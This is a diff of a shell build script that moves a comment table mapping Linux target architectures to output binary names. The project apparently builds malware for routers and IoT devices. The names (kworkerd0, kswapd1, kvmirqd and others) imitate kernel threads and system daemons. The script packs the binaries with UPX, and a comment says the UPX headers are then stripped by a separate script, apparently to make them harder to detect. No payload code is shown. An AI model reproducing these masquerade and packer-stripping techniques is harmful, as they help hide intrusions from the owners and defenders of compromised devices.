@@ -4,7 +4,25 @@
 # yes we are using UPX (GO is large) reducing file size from 8mb to 2mb here.
 # UPX headers will be stripped automatically by deUPX.py.
 
-
+# ======================== BINARY ARCHITECTURE MAPPING ========================
+# Build for all architectures - each gets a different binary name from AMBS array
+# 
+# BINARY NAME    | ARCHITECTURE    | GOOS  | GOARCH | GOARM | COMMENTS
+# ---------------|-----------------|-------|--------|-------|-------------------
+# kworkerd0      | x86 (386)       | linux | 386    |       | 32-bit Intel/AMD
+# ethd0          | x86_64          | linux | amd64  |       | 64-bit Intel/AMD
+# mdsync1        | ARMv7           | linux | arm    | 7     | ARM 32-bit v7 (Raspberry Pi 2/3)
+# ksnapd0        | ARMv5           | linux | arm    | 5     | ARM 32-bit v5 (older ARM)
+# kswapd1        | ARMv6           | linux | arm    | 6     | ARM 32-bit v6 (Raspberry Pi 1)
+# ip6addrd       | ARM64           | linux | arm64  |       | ARM 64-bit (Raspberry Pi 4, Android)
+# deferwqd       | MIPS            | linux | mips   |       | MIPS big-endian (routers)
+# devfreqd0      | MIPSLE          | linux | mipsle |       | MIPS little-endian
+# kintegrity0    | MIPS64          | linux | mips64 |       | MIPS 64-bit big-endian
+# biosd0         | MIPS64LE        | linux | mips64le |     | MIPS 64-bit little-endian
+# kpsmoused0     | PPC64           | linux | ppc64  |       | PowerPC 64-bit big-endian
+# ttmswapd       | PPC64LE         | linux | ppc64le |      | PowerPC 64-bit little-endian
+# vredisd0       | s390x           | linux | s390x  |       | IBM System/390 64-bit
+# kvmirqd        | RISC-V 64       | linux | riscv64|       | RISC-V 64-bit
 
 # Get the directory where this script is located (tools/)
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
@@ -62,27 +80,6 @@ build_for_arch() {
         echo "UPX compression skipped for $arch_name"
     fi
     INDEX=$((INDEX + 1))
-}
-
-# ======================== BINARY ARCHITECTURE MAPPING ========================
-# Build for all architectures - each gets a different binary name from AMBS array
-# 
-# BINARY NAME    | ARCHITECTURE    | GOOS  | GOARCH | GOARM | COMMENTS
-# ---------------|-----------------|-------|--------|-------|-------------------
-# kworkerd0      | x86 (386)       | linux | 386    |       | 32-bit Intel/AMD
-# ethd0          | x86_64          | linux | amd64  |       | 64-bit Intel/AMD
-# mdsync1        | ARMv7           | linux | arm    | 7     | ARM 32-bit v7 (Raspberry Pi 2/3)
-# ksnapd0        | ARMv5           | linux | arm    | 5     | ARM 32-bit v5 (older ARM)
-# kswapd1        | ARMv6           | linux | arm    | 6     | ARM 32-bit v6 (Raspberry Pi 1)
-# ip6addrd       | ARM64           | linux | arm64  |       | ARM 64-bit (Raspberry Pi 4, Android)
-# deferwqd       | MIPS            | linux | mips   |       | MIPS big-endian (routers)
-# devfreqd0      | MIPSLE          | linux | mipsle |       | MIPS little-endian
-# kintegrity0    | MIPS64          | linux | mips64 |       | MIPS 64-bit big-endian
-# biosd0         | MIPS64LE        | linux | mips64le |     | MIPS 64-bit little-endian
-# kpsmoused0     | PPC64           | linux | ppc64  |       | PowerPC 64-bit big-endian
-# ttmswapd       | PPC64LE         | linux | ppc64le |      | PowerPC 64-bit little-endian
-# vredisd0       | s390x           | linux | s390x  |       | IBM System/390 64-bit
-# kvmirqd        | RISC-V 64       | linux | riscv64|       | RISC-V 64-bit
 
 # Build for all architectures
 build_for_arch "x86 (386)" "linux" "386"         # kworkerd0
